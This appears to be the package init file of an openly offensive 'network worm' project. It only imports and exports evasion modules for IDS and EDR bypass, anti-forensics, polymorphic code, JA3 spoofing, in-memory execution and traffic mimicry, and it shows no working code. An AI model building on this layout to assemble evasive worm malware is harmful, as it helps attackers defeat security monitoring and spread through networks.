"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""Evasion package - FIX: Export all classes"""

from .ids_detector import IDSDetector
from .stealth_engine import StealthEngine
from .advanced_evasion import AdvancedEvasion
from .advanced_polymorphic import AdvancedPolymorphicEngine
from .anti_forensics import AntiForensics
from .edr_bypass import EDRBypass
from .enterprise_evasion import EnterpriseEvasionEngine
from .evasion_model import EvasionModel
from .ids_evasion import IDSEvasionEngine
from .ja3_spoof import JA3Spoofer
from .memory_execution import MemoryExecution
from .polymorphic_engine import PolymorphicEngine
from .semantic_polymorphism import SemanticPolymorphicEngine
from .sleep_obfuscation import SleepObfuscator
from .traffic_mimicry import TrafficMimicryEngine

__all__ = [
    "IDSDetector",
    "StealthEngine",
    "AdvancedEvasion",
    "AdvancedPolymorphicEngine",
    "AntiForensics",
    "EDRBypass",
    "EnterpriseEvasionEngine",
    "EvasionModel",
    "IDSEvasionEngine",
    "JA3Spoofer",
    "MemoryExecution",
    "PolymorphicEngine",
    "SemanticPolymorphicEngine",
    "SleepObfuscator",
    "TrafficMimicryEngine",
]
